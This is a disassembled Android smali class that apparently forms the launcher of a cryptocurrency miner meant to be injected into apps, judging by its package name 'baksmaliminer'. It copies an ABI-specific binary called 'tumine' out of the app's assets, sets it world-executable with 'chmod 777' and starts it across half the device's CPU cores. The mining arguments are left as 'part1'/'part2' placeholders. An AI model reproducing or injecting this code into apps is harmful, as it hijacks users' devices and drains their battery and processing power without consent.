.class Lits/name/baksmaliminer/Miner$1;
.super Ljava/lang/Object;
.source "Miner.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lits/name/baksmaliminer/Miner;->action(Ljava/lang/Boolean;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lits/name/baksmaliminer/Miner;


# direct methods
.method constructor <init>(Lits/name/baksmaliminer/Miner;)V
    .registers 2
    .param p1, "this$0"    # Lits/name/baksmaliminer/Miner;

    .prologue
    .line 21
    iput-object p1, p0, Lits/name/baksmaliminer/Miner$1;->this$0:Lits/name/baksmaliminer/Miner;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .registers 21

    .prologue
    .line 25
    :try_start_0
    sget-object v17, Lits/name/baksmaliminer/Miner;->process:Ljava/lang/Process;

    if-eqz v17, :cond_9

    .line 26
    sget-object v17, Lits/name/baksmaliminer/Miner;->process:Ljava/lang/Process;

    invoke-virtual/range {v17 .. v17}, Ljava/lang/Process;->destroy()V

    .line 29
    :cond_9
    new-instance v14, Ljava/io/File;

    sget-object v17, Lits/name/baksmaliminer/Miner;->context:Landroid/content/Context;

    invoke-virtual/range {v17 .. v17}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v17

    invoke-virtual/range {v17 .. v17}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v17

    const-string v18, "tumine"

    move-object/from16 v0, v17

    move-object/from16 v1, v18

    invoke-direct {v14, v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 30
    .local v14, "outputFile":Ljava/io/File;
    invoke-virtual {v14}, Ljava/io/File;->exists()Z

    move-result v17

    if-nez v17, :cond_d3

    .line 33
    const/4 v11, 0x0

    .line 35
    .local v11, "file":Ljava/lang/String;
    sget v17, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v18, 0x15

    move/from16 v0, v17

    move/from16 v1, v18

    if-lt v0, v1, :cond_51

    .line 36
    sget-object v4, Landroid/os/Build;->SUPPORTED_ABIS:[Ljava/lang/String;

    .line 40
    .local v4, "abis":[Ljava/lang/String;
    :goto_31
    array-length v0, v4

    move/from16 v18, v0

    const/16 v17, 0x0

    :goto_36
    move/from16 v0, v17

    move/from16 v1, v18

    if-ge v0, v1, :cond_4e

    aget-object v3, v4, v17

    .line 41
    .local v3, "abi2":Ljava/lang/String;
    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    .line 42
    .local v2, "abi":Ljava/lang/String;
    const-string v19, "arm64-v8a"

    move-object/from16 v0, v19

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v19

    if-eqz v19, :cond_64

    .line 43
    const-string v11, "tumine64arm"

    .line 56
    .end local v2    # "abi":Ljava/lang/String;
    .end local v3    # "abi2":Ljava/lang/String;
    :cond_4e
    :goto_4e
    if-nez v11, :cond_81

    .line 89
    .end local v4    # "abis":[Ljava/lang/String;
    .end local v11    # "file":Ljava/lang/String;
    .end local v14    # "outputFile":Ljava/io/File;
    :goto_50
    return-void

    .line 38
    .restart local v11    # "file":Ljava/lang/String;
    .restart local v14    # "outputFile":Ljava/io/File;
    :cond_51
    const/16 v17, 0x2

    move/from16 v0, v17

    new-array v4, v0, [Ljava/lang/String;

    const/16 v17, 0x0

    sget-object v18, Landroid/os/Build;->CPU_ABI:Ljava/lang/String;

    aput-object v18, v4, v17

    const/16 v17, 0x1

    sget-object v18, Landroid/os/Build;->CPU_ABI2:Ljava/lang/String;

    aput-object v18, v4, v17

    .restart local v4    # "abis":[Ljava/lang/String;
    goto :goto_31

    .line 46
    .restart local v2    # "abi":Ljava/lang/String;
    .restart local v3    # "abi2":Ljava/lang/String;
    :cond_64
    const-string v19, "x86"

    move-object/from16 v0, v19

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v19

    if-eqz v19, :cond_71

    .line 47
    const-string v11, "tumine86"

    .line 48
    goto :goto_4e

    .line 50
    :cond_71
    const-string v19, "armeabi-v7a"

    move-object/from16 v0, v19

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v19

    if-eqz v19, :cond_7e

    .line 51
    const-string v11, "tumine86arm"

    .line 52
    goto :goto_4e

    .line 40
    :cond_7e
    add-int/lit8 v17, v17, 0x1

    goto :goto_36

    .line 60
    .end local v2    # "abi":Ljava/lang/String;
    .end local v3    # "abi2":Ljava/lang/String;
    :cond_81
    sget-object v17, Lits/name/baksmaliminer/Miner;->context:Landroid/content/Context;

    invoke-virtual/range {v17 .. v17}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v17

    move-object/from16 v0, v17

    invoke-virtual {v0, v11}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v12

    .line 62
    .local v12, "is":Ljava/io/InputStream;
    new-instance v13, Ljava/io/FileOutputStream;

    invoke-direct {v13, v14}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 63
    .local v13, "out":Ljava/io/OutputStream;
    invoke-virtual {v14}, Ljava/io/File;->createNewFile()Z

    .line 64
    const/16 v17, 0x2000

    move/from16 v0, v17

    new-array v6, v0, [B

    .line 65
    .local v6, "buffer":[B
    invoke-virtual {v12, v6}, Ljava/io/InputStream;->read([B)I

    move-result v7

    .line 66
    .local v7, "bytes":I
    :goto_9f
    if-ltz v7, :cond_ad

    .line 67
    const/16 v17, 0x0

    move/from16 v0, v17

    invoke-virtual {v13, v6, v0, v7}, Ljava/io/OutputStream;->write([BII)V

    .line 68
    invoke-virtual {v12, v6}, Ljava/io/InputStream;->read([B)I

    move-result v7

    goto :goto_9f

    .line 70
    :cond_ad
    invoke-virtual {v13}, Ljava/io/OutputStream;->flush()V

    .line 71
    invoke-virtual {v13}, Ljava/io/OutputStream;->close()V

    .line 73
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v17

    new-instance v18, Ljava/lang/StringBuilder;

    invoke-direct/range {v18 .. v18}, Ljava/lang/StringBuilder;-><init>()V

    const-string v19, "/system/bin/chmod 777 "

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    move-object/from16 v0, v18

    invoke-virtual {v0, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v18

    invoke-virtual/range {v18 .. v18}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v8

    .line 74
    .local v8, "chmod":Ljava/lang/Process;
    invoke-virtual {v8}, Ljava/lang/Process;->waitFor()I

    .line 76
    .end local v4    # "abis":[Ljava/lang/String;
    .end local v6    # "buffer":[B
    .end local v7    # "bytes":I
    .end local v8    # "chmod":Ljava/lang/Process;
    .end local v11    # "file":Ljava/lang/String;
    .end local v12    # "is":Ljava/io/InputStream;
    .end local v13    # "out":Ljava/io/OutputStream;
    :cond_d3
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v17

    invoke-virtual/range {v17 .. v17}, Ljava/lang/Runtime;->availableProcessors()I

    move-result v16

    .line 77
    .local v16, "threads":I
    const/16 v17, 0x1

    move/from16 v0, v16

    move/from16 v1, v17

    if-gt v0, v1, :cond_136

    const/16 v16, 0x1

    .line 78
    :goto_e5
    new-instance v17, Ljava/lang/StringBuilder;

    invoke-direct/range {v17 .. v17}, Ljava/lang/StringBuilder;-><init>()V

    const-string v18, "part1"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    move-object/from16 v0, v17

    move/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v17

    const-string v18, "part2"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 79
    .local v5, "args":Ljava/lang/String;
    new-instance v15, Ljava/lang/ProcessBuilder;

    const/16 v17, 0x2

    move/from16 v0, v17

    new-array v0, v0, [Ljava/lang/String;

    move-object/from16 v17, v0

    const/16 v18, 0x0

    invoke-virtual {v14}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v19

    aput-object v19, v17, v18

    const/16 v18, 0x1

    aput-object v5, v17, v18

    move-object/from16 v0, v17

    invoke-direct {v15, v0}, Ljava/lang/ProcessBuilder;-><init>([Ljava/lang/String;)V
    :try_end_11d
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_11d} :catch_130

    .line 81
    .local v15, "pb":Ljava/lang/ProcessBuilder;
    :try_start_11d
    invoke-virtual {v15}, Ljava/lang/ProcessBuilder;->start()Ljava/lang/Process;

    move-result-object v17

    sput-object v17, Lits/name/baksmaliminer/Miner;->process:Ljava/lang/Process;

    .line 82
    sget-object v17, Lits/name/baksmaliminer/Miner;->process:Ljava/lang/Process;

    invoke-virtual/range {v17 .. v17}, Ljava/lang/Process;->waitFor()I
    :try_end_128
    .catch Ljava/lang/Exception; {:try_start_11d .. :try_end_128} :catch_12a
    .catch Ljava/lang/Throwable; {:try_start_11d .. :try_end_128} :catch_130

    goto/16 :goto_50

    .line 83
    :catch_12a
    move-exception v9

    .line 84
    .local v9, "e":Ljava/lang/Exception;
    :try_start_12b
    invoke-virtual {v9}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_12e
    .catch Ljava/lang/Throwable; {:try_start_12b .. :try_end_12e} :catch_130

    goto/16 :goto_50

    .line 86
    .end local v5    # "args":Ljava/lang/String;
    .end local v9    # "e":Ljava/lang/Exception;
    .end local v14    # "outputFile":Ljava/io/File;
    .end local v15    # "pb":Ljava/lang/ProcessBuilder;
    .end local v16    # "threads":I
    :catch_130
    move-exception v10

    .line 87
    .local v10, "ex":Ljava/lang/Throwable;
    invoke-virtual {v10}, Ljava/lang/Throwable;->printStackTrace()V

    goto/16 :goto_50

    .line 77
    .end local v10    # "ex":Ljava/lang/Throwable;
    .restart local v14    # "outputFile":Ljava/io/File;
    .restart local v16    # "threads":I
    :cond_136
    :try_start_136
    div-int/lit8 v16, v16, 0x2
    :try_end_138
    .catch Ljava/lang/Throwable; {:try_start_136 .. :try_end_138} :catch_130

    goto :goto_e5
.end method
